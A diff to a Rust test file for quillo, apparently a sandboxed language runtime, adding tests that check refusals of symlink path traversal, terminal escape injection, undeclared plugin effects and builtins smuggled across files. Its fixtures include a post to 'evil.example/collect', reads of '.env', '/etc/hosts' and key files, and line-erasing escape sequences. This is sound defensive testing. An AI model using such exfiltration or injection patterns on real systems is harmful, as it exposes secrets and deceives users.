@@ -969,7 +969,6 @@ fn the_stdio_door_offers_no_unconfirmed_tool() {
 /// it should do: hold a builtin taken as a value to the file that took it, as a lambda is held to
 /// the file it was written in (coverage of feedback82-85; branch feedback82-85).
 #[test]
-#[ignore = "bug: a builtin handed to another file's helper is held to the helper's file"]
 fn a_builtin_handed_to_a_helper_is_held_to_the_file_that_took_it() {
     let d = dir("deputy");
     write(&d, "main.qwe", "use lib/config.qwe\nimport kit/badge.qwe use Badge, steal\nroute GET / = <html><body><Badge/></body></html>\nroute GET /s = steal() ?? \"refused\"\n");
@@ -990,7 +989,6 @@ fn a_builtin_handed_to_a_helper_is_held_to_the_file_that_took_it() {
 /// reaches (`\u{1b}[1A\u{1b}[2K`). What it should do: show such a character escaped, as the file
 /// it writes does (coverage of feedback82-85; branch feedback82-85).
 #[test]
-#[ignore = "bug: the listing prints a terminal's control characters from the program's texts"]
 fn the_listing_shows_no_control_character_of_the_program() {
     let d = dir("escape");
     write(&d, "main.qwe", "import kit/k.qwe use Badge\nroute GET / = <html><body><Badge/></body></html>\n");
@@ -1000,4 +998,532 @@ fn the_listing_shows_no_control_character_of_the_program() {
     let (_, out) = quillo(&d, &["confirm"]);
     assert!(out.contains("reaches       evil.example"), "{}", out);
     assert!(!out.contains('\u{1b}') && !out.contains('\r'), "{:?}", out);
+}
+
+// ---- fixes of what the coverage tests found (slice X1) -----------------------------------------
+
+/// The program of `a_path_past_a_link_is_held_where_the_system_takes_it`: each line says whether
+/// the hold let it through.
+const PAST_LINK: &str = r#"let u = "http://127.0.0.1:PORT/ok"
+let p = join(["data", "media", "..", "y.bin"], "/")
+let said = (x) => is_err(x) ? "refused" : "done"
+print("save through the link: " + said(http.get(u, {}, { save: "data/media/x.bin", public_only: false })))
+print("save past it: " + said(http.get(u, {}, { save: p, public_only: false })))
+print("write past it: " + said(write_file(join(["data", "media", "..", "w.txt"], "/"), "written")))
+print("read past it: " + (read_file(p) ?? "refused"))
+print("read by its whole path: " + (read_file(env("APP_DIR") + "/" + p) ?? "refused"))
+print("read with a dot: " + (read_file(join(["data", "media", ".", "..", "y.bin"], "/")) ?? "refused"))
+print("read past it twice: " + (read_file(join(["data", "media", "..", "media", "..", "y.bin"], "/")) ?? "refused"))
+print("write past a name not there: " + said(write_file(join(["data", "media", "sub", "..", "..", "z.txt"], "/"), "z")))
+print("read past a unicode link: " + (read_file(join(["data", "médias", "..", "ü.bin"], "/")) ?? "refused"))
+print(image.convert("data/plain.txt", join(["data", "media", "..", "c.png"], "/")))
+print("write into the folder confirmed past it: " + said(write_file(join(["data", "media", "..", "ok", "w.txt"], "/"), "ok")))
+print("write beside that folder: " + said(write_file(join(["data", "media", "..", "okx", "w.txt"], "/"), "no")))
+print("read plain: " + (read_file("data/plain.txt") ?? "refused"))
+"#;
+
+/// A held path is judged where the system takes it: with `data/media` a link to
+/// `../../shared/media`, `data/media/../y.bin` is `shared/y.bin`, which `data/` does not cover,
+/// for `read_file`, `write_file`, `http.get`'s `save:` and `image.convert`'s path, written whole,
+/// with a `.`, twice over, past a Unicode link; a folder confirmed past the link is written, the
+/// one beside it with a longer name is not, and a plain path is read (src/confirm.rs real_under,
+/// path_in; FEEDBACK83.md Q-1300, found by the coverage tests; branch feedback82-85).
+#[cfg(unix)]
+#[test]
+fn a_path_past_a_link_is_held_where_the_system_takes_it() {
+    let (other, _) = other_server();
+    let d = dir("past-link");
+    let (app, shared) = (d.join("app"), d.join("shared"));
+    std::fs::create_dir_all(app.join("data")).unwrap();
+    std::fs::create_dir_all(shared.join("media")).unwrap();
+    std::fs::create_dir_all(shared.join("ok")).unwrap();
+    std::os::unix::fs::symlink("../../shared/media", app.join("data/media")).unwrap();
+    std::os::unix::fs::symlink("../../shared/media", app.join("data/médias")).unwrap();
+    write(&shared, "y.bin", "secret");
+    write(&shared, "ü.bin", "unicode secret");
+    write(&app, "data/plain.txt", "plain");
+    write(&app, "main.qwe", &PAST_LINK.replace("PORT", &other.to_string()));
+    write(&app, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"127.0.0.1\"]\nfiles = [\"data/\"]\nwrites = [\"data/\", \"../shared/ok/\"]\n");
+    let (code, out) = quillo(&app, &["check", "main.qwe"]);
+    assert_eq!(code, Some(0), "{}", out);
+    let app_dir = app.display().to_string();
+    let (code, out) = quillo_env(&app, &["run", "main.qwe", "--allow-path", "../shared"], 60, &[("APP_DIR", &app_dir)]);
+    assert_eq!(code, Some(0), "{}", out);
+    for line in [
+        "save through the link: refused",
+        "save past it: refused",
+        "write past it: refused",
+        "read past it: refused",
+        "read by its whole path: refused",
+        "read with a dot: refused",
+        "read past it twice: refused",
+        "write past a name not there: refused",
+        "read past a unicode link: refused",
+        "write into the folder confirmed past it: done",
+        "write beside that folder: refused",
+        "read plain: plain",
+    ] {
+        assert!(out.contains(&format!("{}\n", line)), "{}: {}", line, out);
+    }
+    let real = shared.canonicalize().unwrap();
+    assert!(out.contains(&format!("err(\"image: {}/c.png is not confirmed for main.qwe (quillo confirm)\")", real.display())), "{}", out);
+    assert!(out.contains(&format!("quillo: main.qwe: the path {}/y.bin was refused: it is not confirmed for this file", real.display())), "{}", out);
+    // Nothing written in shared/ but in the folder confirmed; what was there is as it was.
+    assert_eq!(read(&shared.join("y.bin")), "secret");
+    for not in ["w.txt", "z.txt", "c.png", "okx", "media/x.bin"] {
+        assert!(!shared.join(not).exists(), "{} written", not);
+    }
+    assert_eq!(read(&shared.join("ok/w.txt")), "ok");
+}
+
+/// A link that leads nowhere, in a folder `--allow-path` names, is not written through: its target
+/// would be made wherever it leads, here outside every folder named; a link in it that leads to a
+/// file there is written as before (src/builtins.rs allowed_path; FEEDBACK29.md Q-357's folders,
+/// found fixing FEEDBACK83.md Q-1300; branch feedback82-85).
+#[cfg(unix)]
+#[test]
+fn a_link_that_leads_nowhere_in_an_allowed_folder_is_not_written_through() {
+    let d = dir("allow-dangling");
+    let (app, shared, outside) = (d.join("app"), d.join("shared"), d.join("outside"));
+    for f in [&app, &shared, &outside] {
+        std::fs::create_dir_all(f).unwrap();
+    }
+    std::os::unix::fs::symlink("../outside/made.txt", shared.join("dl")).unwrap();
+    std::os::unix::fs::symlink("../outside/fait-é.txt", shared.join("lien-é")).unwrap();
+    std::os::unix::fs::symlink("real.txt", shared.join("live")).unwrap();
+    write(&shared, "real.txt", "before");
+    write(
+        &app,
+        "main.qwe",
+        "let said = (x) => is_err(x) ? \"refused\" : \"written\"\nprint(\"nowhere: \" + said(write_file(\"../shared/dl\", \"through the link\")))\nprint(\"unicode: \" + said(write_file(\"../shared/lien-é\", \"é\")))\nprint(\"a file there: \" + said(write_file(\"../shared/live\", \"after\")))\n",
+    );
+    let (code, out) = quillo_env(&app, &["run", "main.qwe", "--allow-path", "../shared"], 60, &[]);
+    assert_eq!(code, Some(0), "{}", out);
+    for line in ["nowhere: refused\n", "unicode: refused\n", "a file there: written\n"] {
+        assert!(out.contains(line), "{}: {}", line, out);
+    }
+    assert!(std::fs::read_dir(&outside).unwrap().next().is_none(), "made outside");
+    assert_eq!(read(&shared.join("real.txt")), "after");
+}
+
+/// What a terminal acts on in a path a taken file reads (an escape sequence, an eight-bit CSI, a
+/// turn of direction, DEL, a tab) is shown escaped by `quillo confirm --list` and by the held run's
+/// message, `é` as it is; `quillo confirm --yes` writes it escaped and reads it back as the same
+/// path (src/confirm.rs escaped, quote, unquote, whole_listing, Hold::say; FEEDBACK83.md Q-1300
+/// D.2, found by the coverage tests; branch feedback82-85).
+#[test]
+fn the_programs_texts_are_shown_escaped_wherever_they_are_said() {
+    let d = dir("escape-all");
+    write(&d, "main.qwe", "import kit/k.qwe use Badge\nroute GET / = <html><body><Badge/></body></html>\n");
+    write(&d, "kit/k.qwe", "let x = read_file(\"cache/\\u{1b}[2K\\u{9b}1A\\u{202e}gnp\\u{7f}\\té\")\ncomponent Badge() { <b>b</b> }\n");
+    let shown = "cache/\\u{1b}[2K\\u{9b}1A\\u{202e}gnp\\u{7f}\\té";
+    let raw: &[char] = &['\u{1b}', '\u{9b}', '\u{202e}', '\u{7f}', '\t'];
+    let (code, out) = quillo(&d, &["confirm", "--list"]);
+    assert_eq!(code, Some(0), "{}", out);
+    assert!(out.contains(&format!("  reads         {} 1\n", shown)), "{:?}", out);
+    assert!(!out.contains(raw), "{:?}", out);
+    // Held to a file that confirms nothing for it: refused, and said escaped.
+    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
+    let (g, _, log) = serve(&d, &[]);
+    assert!(log_has(&log, &format!("quillo: kit/k.qwe: the path {} was refused", shown), 30), "{:?}", read(&log));
+    drop(g);
+    assert!(!read(&log).contains(raw), "{:?}", read(&log));
+    // Confirmed: written escaped, read back as the same path.
+    let (code, out) = quillo(&d, &["confirm", "--yes"]);
+    assert_eq!(code, Some(0), "{}", out);
+    assert!(!out.contains(raw), "{:?}", out);
+    let text = read(&d.join("quillo.confirmed"));
+    assert!(text.contains(&format!("files = [\"{}\"]", shown)), "{:?}", text);
+    assert!(!text.contains(raw), "{:?}", text);
+    let (code, out) = quillo(&d, &["check", "main.qwe"]);
+    assert_eq!(code, Some(0), "{}", out);
+    assert!(!out.contains("not confirmed"), "{}", out);
+}
+
+/// The listing `quillo run` shows at a terminal before it asks shows a path's escape sequence
+/// escaped, never as the sequence that would erase the line above (src/confirm.rs listing,
+/// at_start_in; FEEDBACK83.md Q-1300 D.2, found by the coverage tests; branch feedback82-85).
+#[cfg(unix)]
+#[test]
+fn a_start_at_a_terminal_lists_the_programs_texts_escaped() {
+    let d = dir("escape-ask");
+    write(&d, "main.qwe", "import kit/k.qwe use Badge\nroute GET / = <html><body><Badge/></body></html>\n");
+    write(&d, "kit/k.qwe", "let sent = http.post(\"https://evil.example/collect\", {})\nlet x = read_file(\"cache/\\u{1b}[1A\\u{1b}[2K\\r    reads         cache/\")\ncomponent Badge() { <b>b</b> }\n");
+    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
+    let mut t = Tty::start(&d, &["run", "main.qwe", "--port", "0"]);
+    assert!(t.wait_for("[n] not now: "), "{}", t.text());
+    let text = t.text();
+    assert!(text.contains("    reaches       evil.example"), "{:?}", text);
+    assert!(text.contains("    reads         cache/\\u{1b}[1A\\u{1b}[2K\\r    reads         cache/ line 2"), "{:?}", text);
+    assert!(!text.contains("\u{1b}[1A") && !text.contains("\u{1b}[2K"), "{:?}", text);
+    t.answer("n");
+    let _ = t.port();
+}
+
+/// `quillo confirm` makes its new file new beside the old one: a link at that name is not written
+/// through, and nothing is written; a file a run with the same process number left there is taken
+/// away first (src/confirm.rs write; FEEDBACK83.md Q-1300, found by the coverage tests; branch
+/// feedback82-85).
+#[cfg(unix)]
+#[test]
+fn the_new_file_is_never_written_through_a_link_at_its_name() {
+    let d = dir("part-link");
+    write(&d, "main.qwe", "route GET / = http.get(\"https://api.example.com/x\").status ?? 0\n");
+    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
+    let elsewhere = d.join("elsewhere.txt");
+    let mut t = Tty::start(&d, &["confirm"]);
+    assert!(t.wait_for("[n] none: "), "{}", t.text());
+    let name = format!(".quillo.confirmed.{}.part", t.child.id());
+    std::os::unix::fs::symlink(&elsewhere, d.join(&name)).unwrap();
+    t.answer("y");
+    assert_eq!(t.exit(), Some(1), "{}", t.text());
+    assert!(t.text().contains(&format!("quillo confirm: ./{} is a symbolic link: nothing written", name)), "{}", t.text());
+    assert!(!elsewhere.exists(), "written through the link");
+    assert_eq!(read(&d.join("quillo.confirmed")), "[\"main.qwe\"]\n");
+    assert!(std::fs::symlink_metadata(d.join(&name)).unwrap().file_type().is_symlink());
+    std::fs::remove_file(d.join(&name)).unwrap();
+    // A file a run of the same number left: taken away, and the list written whole.
+    let mut t = Tty::start(&d, &["confirm"]);
+    assert!(t.wait_for("[n] none: "), "{}", t.text());
+    let name = format!(".quillo.confirmed.{}.part", t.child.id());
+    std::fs::write(d.join(&name), "left by a run before, and longer than the list ".repeat(40)).unwrap();
+    t.answer("y");
+    assert_eq!(t.exit(), Some(0), "{}", t.text());
+    assert!(!d.join(&name).exists());
+    let text = read(&d.join("quillo.confirmed"));
+    assert!(text.contains("[\"main.qwe\"]\nhttp = [\"api.example.com\"]\n") && !text.contains("left by"), "{}", text);
+}
+
+/// A start whose `quillo.confirmed` is a symbolic link says so once, with the file it leads to,
+/// and is held to it; a plain file is not said (src/confirm.rs at_start_in; FEEDBACK83.md Q-1300,
+/// found by the coverage tests; branch feedback82-85).
+#[cfg(unix)]
+#[test]
+fn a_start_says_once_that_its_confirmed_file_is_a_link() {
+    let (other, seen) = other_server();
+    let d = dir("link-start");
+    write(&d, "main.qwe", &format!("route GET / = http.get(\"http://127.0.0.1:{}/x\").body ?? \"refused\"\n", other));
+    write(&d, "kept/real.confirmed", "[\"main.qwe\"]\n");
+    std::os::unix::fs::symlink("kept/real.confirmed", d.join("quillo.confirmed")).unwrap();
+    let (g, port, log) = serve(&d, &[]);
+    assert_eq!(send(port, "GET", "/", &[], "").body, "refused");
+    drop(g);
+    let real = d.join("kept/real.confirmed").canonicalize().unwrap();
+    let said = format!("quillo: ./quillo.confirmed is a symbolic link, to {}: the program is held to what that file says\n", real.display());
+    assert_eq!(read(&log).matches(&said).count(), 1, "{}", read(&log));
+    assert_eq!(seen.load(Ordering::SeqCst), 0);
+    std::fs::remove_file(d.join("quillo.confirmed")).unwrap();
+    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
+    let (g, _, log) = serve(&d, &[]);
+    drop(g);
+    assert!(!read(&log).contains("symbolic link"), "{}", read(&log));
+}
+
+/// A block of a file no longer taken leaves with each of its items counted: three hosts, one of
+/// them a pattern, and a folder are 4, a Rust file's SHA-256 is 1, an empty block nothing; one item
+/// is said as one; and a file the PATHs given leave out keeps its items, which are not counted
+/// (src/confirm.rs stale; FEEDBACK83.md Q-1300 D.3, found by the coverage tests; branch
+/// feedback82-85).
+#[test]
+fn a_block_no_longer_taken_is_counted_by_its_items() {
+    let d = dir("stale-count");
+    write(&d, "main.qwe", "route GET / = \"up\"\n");
+    write(
+        &d,
+        "quillo.confirmed",
+        &format!("[\"main.qwe\"]\n\n[\"old.qwe\"]\nhttp = [\"a.example\", \"b.example\", \"*.c.example\"]\nfiles = [\"data/\"]\n\n[\"gone.qwer\"]\nsha256 = \"{}\"\neffects = \"none\"\n\n[\"empty.qwe\"]\n", "0".repeat(64)),
+    );
+    let (code, out) = quillo(&d, &["confirm"]);
+    assert_eq!(code, Some(0), "{}", out);
+    assert!(out.contains("quillo: 5 items no longer in the files left quillo.confirmed\n"), "{}", out);
+    let text = read(&d.join("quillo.confirmed"));
+    assert!(!text.contains("old.qwe") && !text.contains("gone.qwer"), "{}", text);
+    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n\n[\"old.qwe\"]\nhttp = [\"a.example\"]\n");
+    let (code, out) = quillo(&d, &["confirm"]);
+    assert_eq!(code, Some(0), "{}", out);
+    assert!(out.contains("quillo: 1 item no longer in the files left quillo.confirmed\n"), "{}", out);
+    // Only lib/ chosen: main.qwe's host no longer written stays, and is not counted.
+    write(&d, "main.qwe", "use lib/a.qwe\nroute GET / = a()\n");
+    write(&d, "lib/a.qwe", "fn a() = \"a\"\n");
+    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"gone.example\"]\n\n[\"lib/a.qwe\"]\nhttp = [\"one.example\"]\n");
+    let (code, out) = quillo(&d, &["confirm", "main.qwe", "lib/"]);
+    assert_eq!(code, Some(0), "{}", out);
+    assert!(out.contains("quillo: 1 item no longer in the files left quillo.confirmed\n"), "{}", out);
+    let text = read(&d.join("quillo.confirmed"));
+    assert!(text.contains("[\"main.qwe\"]\nhttp = [\"gone.example\"]\n") && !text.contains("\"one.example\""), "{}", text);
+}
+
+/// What `quillo confirm --effects` reads of a Rust file in the spellings that read as `effects:
+/// none`: another name from `use ... as` for a module, a type, a macro, in a group, a Unicode
+/// one; a crate's (`extern crate ... as`, a dependency's `package =`); spaces and line breaks
+/// around `::` and before `(` (the call at its first line, the next at its own); `include_str!`,
+/// `include_bytes!`, `include!`; and what is none of these (another name for a map, a parser, a
+/// trait; an empty file) still nothing (src/confirm.rs rust_spelled, rust_joined,
+/// rust_use_names, scan_rust; FEEDBACK83.md Q-1305, found by the coverage tests; branch
+/// feedback82-85).
+#[test]
+fn the_rust_reading_sees_other_names_spaces_and_included_files() {
+    let d = dir("rust-spellings");
+    let cases: &[(&str, &str, &str)] = &[
+        ("use std::fs as g;\npub fn a(p: String) { let _ = g::write(&p, b\"x\"); }\n", "fs", "std::fs::write (line 3)"),
+        ("use std::net::UdpSocket as U;\npub fn a() { let _ = U::bind(\"127.0.0.1:0\"); }\n", "net", "std::net::UdpSocket::bind (line 3)"),
+        ("pub fn a(p: String) -> String { std :: fs :: read_to_string(&p).unwrap_or_default() }\n", "fs", "std::fs::read_to_string (line 2)"),
+        ("pub fn a(p: String) -> String {\n    std\n        ::fs\n        ::read_to_string(&p).unwrap_or_default()\n}\npub fn b() { let _ = std::net::TcpStream::connect(\"x:1\"); }\n", "fs, net", "std::fs::read_to_string (line 3), std::net::TcpStream::connect (line 7)"),
+        ("pub fn a(p: String) { let _ = image::open (&p); }\n", "fs", "image::open (line 2)"),
+        ("pub fn a() -> String { include_str!(\"/etc/hosts\").into() }\n", "fs", "include_str! (line 2)"),
+        ("pub fn a() -> usize { include_bytes![\"../../secret.key\"].len() }\n", "fs", "include_bytes! (line 2)"),
+        ("include!(\"/tmp/more.rs\");\npub fn a() {}\n", "fs", "include! (line 2)"),
+        ("use std::{fs as f, net::{TcpStream as T}};\npub fn a(p: String) { let _ = f::read(&p); let _ = T::connect(\"1.2.3.4:80\"); }\n", "fs, net", "std::fs::read (line 3), std::net::TcpStream::connect (line 3)"),
+        ("use std::include_str as inc;\npub fn a() -> &'static str { inc!(\"/etc/hosts\") }\n", "fs", "std::include_str! (line 3)"),
+        ("use std::fs as fé;\npub fn a(p: String) { let _ = fé::write(&p, \"x\"); }\n", "fs", "std::fs::write (line 3)"),
+        ("extern crate reqwest as rq;\npub fn a(u: String) { let _ = rq::blocking::get(&u); }\n", "http", "reqwest::blocking::get (line 3)"),
+    ];
+    for (i, (code, effects, calls)) in cases.iter().enumerate() {
+        let name = format!("p{}.qwer", i);
+        write(&d, &name, &format!("//! effects: none\n{}", code));
+        let (exit, out) = quillo(&d, &["confirm", "--effects", &name]);
+        assert_eq!(exit, Some(1), "{}: {}", name, out);
+        assert!(out.starts_with(&format!("{}: effects: {}\n  but it says `effects: none`, and calls {}: a reading", name, effects, calls)), "{}: {}", code, out);
+    }
+    // A dependency taken under another name is the crate it is.
+    write(&d, "dep.qwer", "//! version: 1.0.0\n//!\n//! [dependencies]\n//! h = { package = \"reqwest\", version = \"0.12\" }\n\n//! effects: none\npub fn a(u: String) { let _ = h::blocking::get(&u); }\n");
+    let (exit, out) = quillo(&d, &["confirm", "--effects", "dep.qwer"]);
+    assert_eq!(exit, Some(1), "{}", out);
+    assert!(out.starts_with("dep.qwer: effects: http\n  but it says `effects: none`, and calls reqwest::blocking::get (line 7), the crate reqwest: a reading"), "{}", out);
+    // None of these does anything.
+    write(&d, "none.qwer", "//! effects: none\nuse std::collections::HashMap as Map;\nuse serde_json::from_str as parse;\nuse std::io::Write as W;\npub fn a() -> usize { let m: Map<u8, u8> = Map::new(); let _: u8 = parse(\"1\").unwrap(); m.len() }\nfn b(w: &mut dyn W) { let _ = w.flush(); }\n");
+    write(&d, "empty.qwer", "");
+    for name in ["none.qwer", "empty.qwer"] {
+        let (exit, out) = quillo(&d, &["confirm", "--effects", name]);
+        assert_eq!((exit, out.as_str()), (Some(0), format!("{}: effects: none\n", name).as_str()), "{}", name);
+    }
+}
+
+/// A plugin built from the source a policy pins, and refused for its functions' effects lines,
+/// leaves no private folder in the temporary folder, and is said once, at the plugin's own line,
+/// with the `use` that took it: a function's line wider than its file's, and one said twice
+/// (src/native.rs use_file, loaded; FEEDBACK83.md Q-1305 and FEEDBACK85.md Q-1344, found by the
+/// coverage tests; branch feedback82-85).
+#[test]
+fn a_pinned_plugin_refused_for_its_effects_lines_leaves_nothing_and_says_where() {
+    let d = dir("pin-effects");
+    let (app, tmp) = (d.join("app"), d.join("tmp"));
+    std::fs::create_dir_all(&app).unwrap();
+    std::fs::create_dir_all(&tmp).unwrap();
+    let t = tmp.display().to_string();
+    let wider = "//! version: 1.0.0\n//! effects: none\n\n/// effects: fs\npub fn hi() -> String { \"hi\".into() }\n";
+    let twice = "//! version: 1.0.0\n//! effects: fs\n\n/// Says hi.\n/// effects: fs\n/// effects: none\npub fn hi() -> String { \"hi\".into() }\n";
+    for (src, line, msg) in [
+        (wider, 4, "`hi`'s `/// effects: fs` names fs, which the file's `//! effects: none` does not: a function's line narrows its file's, never widens it"),
+        (twice, 6, "`hi` says its effects twice: one `/// effects:` line"),
+    ] {
+        write(&app, "hi.qwer", src);
+        write(&app, "main.qwe", "\nuse \"hi.qwer\"\nprint(hi())\n");
+        write(&app, "pin.toml", &format!("[plugins]\nallow = [\"hi@sha256:{}\"]\n", sha256_hex(src.as_bytes())));
+        let (code, out) = quillo_env(&app, &["run", "main.qwe", "--no-check", "--policy", "pin.toml"], 600, &[("TMPDIR", &t)]);
+        assert_eq!(code, Some(1), "{}", out);
+        assert!(out.contains(&format!("quillo: ./hi.qwer:{}: {} (the `use` at main.qwe:2)\n", line, msg)), "{}", out);
+        assert_eq!(out.matches("hi.qwer:").count(), 1, "{}", out);
+        let left: Vec<_> = std::fs::read_dir(&tmp).unwrap().flatten().map(|e| e.file_name()).collect();
+        assert!(left.is_empty(), "left in the temporary folder: {:?}", left);
+    }
+}
+
+/// What is escaped for a terminal, at its edges: each control character (U+0000 to U+001F, DEL,
+/// U+0080 to U+009F), the line and paragraph separators and the marks that turn the direction of
+/// text, and nothing either side of them (a space, `~`, U+00A0, U+202F, U+2065, U+206A, a joiner,
+/// `é`, CJK, an emoji); an empty text as it is. And quillo.confirmed written with them reads back
+/// the same, a `\u{...}` it cannot read taken as its letters (src/confirm.rs escaped, unseen,
+/// quote, unquote; FEEDBACK83.md Q-1300 D.2, found by the coverage tests; branch feedback82-85).
+#[test]
+fn what_a_terminal_acts_on_is_escaped_and_nothing_either_side() {
+    use quillo::confirm::{escaped, parse, render, Block, Confirmed};
+    assert_eq!(escaped(""), "");
+    for (c, shown) in [
+        ('\u{0}', "\\u{0}"),
+        ('\u{1f}', "\\u{1f}"),
+        ('\u{7f}', "\\u{7f}"),
+        ('\u{80}', "\\u{80}"),
+        ('\u{9b}', "\\u{9b}"),
+        ('\u{9f}', "\\u{9f}"),
+        ('\u{61c}', "\\u{61c}"),
+        ('\u{200e}', "\\u{200e}"),
+        ('\u{200f}', "\\u{200f}"),
+        ('\u{2028}', "\\u{2028}"),
+        ('\u{2029}', "\\u{2029}"),
+        ('\u{202a}', "\\u{202a}"),
+        ('\u{202e}', "\\u{202e}"),
+        ('\u{2066}', "\\u{2066}"),
+        ('\u{2069}', "\\u{2069}"),
+        ('\n', "\\n"),
+        ('\r', "\\r"),
+        ('\t', "\\t"),
+    ] {
+        assert_eq!(escaped(&format!("a{}b", c)), format!("a{}b", shown), "{:?}", c);
+    }
+    for c in [' ', '~', '\u{a0}', '\u{202f}', '\u{2065}', '\u{206a}', '\u{200d}', 'é', '日', '🙂'] {
+        let s = format!("a{}b", c);
+        assert!(matches!(escaped(&s), std::borrow::Cow::Borrowed(t) if t == s), "{:?}", c);
+    }
+    let item = "a\u{1b}[2K\u{9b}\u{202e}\u{7f}\r\n\t\"\\é日".to_string();
+    let mut b = Block::default();
+    b.files.insert(item.clone(), Vec::new());
+    let mut conf = Confirmed::new();
+    conf.insert("kit/k\u{1b}.qwe".to_string(), b);
+    let text = render(&conf);
+    assert!(!text.contains(['\u{1b}', '\u{9b}', '\u{202e}', '\u{7f}', '\r', '\t']), "{:?}", text);
+    let back = parse(&text).unwrap();
+    assert!(back["kit/k\u{1b}.qwe"].files.contains_key(&item), "{:?}", back);
+    let hand = parse("[\"x\"]\nfiles = [\"a\\u{zz}\", \"b\\u{110000}\", \"c\\u{41}\", \"d\\u{10ffff}\", \"e\\u\"]\n").unwrap();
+    let files: Vec<&str> = hand["x"].files.keys().map(String::as_str).collect();
+    assert_eq!(files, vec!["au{zz}", "bu{110000}", "cA", "d\u{10ffff}", "eu"]);
+}
+
+// ---- a builtin taken as a value, held to the file that named it (slice X2) --------------------
+
+/// The helpers of the program the tests below share: a file confirmed for `.env`, for 127.0.0.1,
+/// and to write `out.txt` and `data/`, whose functions call what they are handed.
+const X2_LIB: &str = "fn secret() = read_file(\".env\") ?? \"\"\nfn apply(f, x) = f(x)\nfn apply2(f, a, b) = f(a, b)\nfn apply3(f, a, b, c) = f(a, b, c)\nfn apply_to(f, x) = f(x)\nfn each(xs, f) = xs | map(f)\nfn run(m, x) = m.r(x)\nfn call_kept(k, x) = k[0](x)\nfn fetch_with(c, u) = c.get(u)\nfn first_of(m, u) = values(m)[0](u)\nfn pipe_to(x, f) = x | f\nfn reader() = read_file\nfn curry(f) = (x) => f(x)\n";
+
+/// Every way a file confirmed for nothing can hand a builtin to the helper of a file confirmed for
+/// what the builtin reaches, each held to the file that named it, which the refusal names: the
+/// builtin given to a call, kept in a map, in a list, under a `let`, at the top of the file, by a
+/// pipe (`|` into `map`, and into a parameter), as a method's receiver (`read_file.apply_to(p)`,
+/// and piped, `p | read_file.curry`), a module's field (`http.get`, `http["get"]`), the module
+/// handed on whole (`c.get(u)`, `values(m)[0]`), `write_file`, `db.open` and `udp.send` too. The
+/// other way: the main file confirmed for `data.txt` hands `read_file` to the helper of a file
+/// confirmed for nothing, and it reads (it was refused, as the helper's). One named in the
+/// confirmed file and handed back is its own (`reader()`). Called by its name in the helper's file,
+/// the builtin is as it was; taken as a value it is still the builtin it is: `==`, `str`,
+/// `type_of`, and JSON refuses it (src/interp.rs, FEEDBACK83.md Q-1300, found by the coverage
+/// tests; branch feedback82-85).
+#[test]
+fn a_builtin_taken_as_a_value_is_held_to_its_file_by_every_way_it_is_handed_on() {
+    let d = dir("x2-every-way");
+    let ways = [
+        ("s", "steal_s() = apply(read_file, \".env\")", "read_file: .env"),
+        ("kept", "steal_kept() = run({ r: read_file }, \".env\")", "read_file: .env"),
+        ("list", "steal_list() = call_kept([read_file], \".env\")", "read_file: .env"),
+        ("let", "steal_let() {\n    let g = read_file\n    return apply(g, \".env\")\n}", "read_file: .env"),
+        ("top", "steal_top() = apply(alias, \".env\")", "read_file: .env"),
+        ("each", "steal_each() = each([\".env\"], read_file)[0]", "read_file: .env"),
+        ("pipe", "steal_pipe() = ([\".env\"] | each(read_file))[0]", "read_file: .env"),
+        ("param", "steal_param() = pipe_to(\".env\", read_file)", "read_file: .env"),
+        ("method", "steal_method() = read_file.apply_to(\".env\")", "read_file: .env"),
+        ("curry", "steal_curry() = \".env\" | read_file.curry", "read_file: .env"),
+        ("get", "steal_get() = apply(http.get, \"http://127.0.0.1:1/\")", "http: 127.0.0.1"),
+        ("index", "steal_index() = apply(http[\"get\"], \"http://127.0.0.1:1/\")", "http: 127.0.0.1"),
+        ("module", "steal_module() = fetch_with(http, \"http://127.0.0.1:1/\")", "http: 127.0.0.1"),
+        ("values", "steal_values() = first_of(http, \"http://127.0.0.1:1/\")", "http: 127.0.0.1"),
+        ("write", "steal_write() = apply2(write_file, \"out.txt\", \"x\")", "write_file: out.txt"),
+        ("db", "steal_db() = apply(db.open, \"data/x.db\")", "db: data/x.db"),
+        ("udp", "steal_udp() = apply3(udp.send, \"127.0.0.1\", 9, \"x\")", "udp.send: 127.0.0.1"),
+    ];
+    let mut kit = String::from("use ../lib/config.qwe\nlet alias = read_file\ncomponent Badge() { <b>b</b> }\nfn rf() = read_file\nfn via_reader() = reader()(\".env\")\n");
+    let mut main = String::from("use lib/config.qwe\nimport kit/badge.qwe use Badge, rf, via_reader");
+    let mut routes = String::new();
+    for (name, f, _) in &ways {
+        kit.push_str(&format!("fn {}\n", f));
+        main.push_str(&format!(", steal_{}", name));
+        routes.push_str(&format!("route GET /{} = steal_{}().error ?? \"done\"\n", name, name));
+    }
+    main.push_str("\nroute GET / = <html><body><Badge/></body></html>\n");
+    main.push_str(&routes);
+    main.push_str("route GET /reader = via_reader()\nroute GET /mine = apply(read_file, \"data.txt\")\nroute GET /direct = secret()\nroute GET /same = str(rf() == read_file) + \" \" + str(rf()) + \" \" + type_of(rf()) + \" \" + str(rf() == upper)\nroute GET /json = json.stringify({ f: rf() }) ?? \"refused\"\n");
+    write(&d, "main.qwe", &main);
+    write(&d, "lib/config.qwe", X2_LIB);
+    write(&d, "kit/badge.qwe", &kit);
+    write(&d, ".env", "SECRET=1\n");
+    write(&d, "data.txt", "D\n");
+    std::fs::create_dir_all(d.join("data")).unwrap();
+    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nfiles = [\"data.txt\"]\n\n[\"lib/config.qwe\"]\nhttp = [\"127.0.0.1\"]\nfiles = [\".env\"]\nwrites = [\"out.txt\", \"data/\"]\n");
+    let (code, out) = quillo(&d, &["check", "main.qwe"]);
+    assert_eq!(code, Some(0), "{}", out);
+    let (g, port, log) = serve(&d, &[]);
+    for (name, _, what) in &ways {
+        let body = send(port, "GET", &format!("/{}", name), &[], "").body;
+        assert_eq!(body, format!("{} is not confirmed for kit/badge.qwe (quillo confirm)", what), "/{}", name);
+    }
+    assert_eq!(send(port, "GET", "/reader", &[], "").body, "SECRET=1\n");
+    assert_eq!(send(port, "GET", "/mine", &[], "").body, "D\n");
+    assert_eq!(send(port, "GET", "/direct", &[], "").body, "SECRET=1\n");
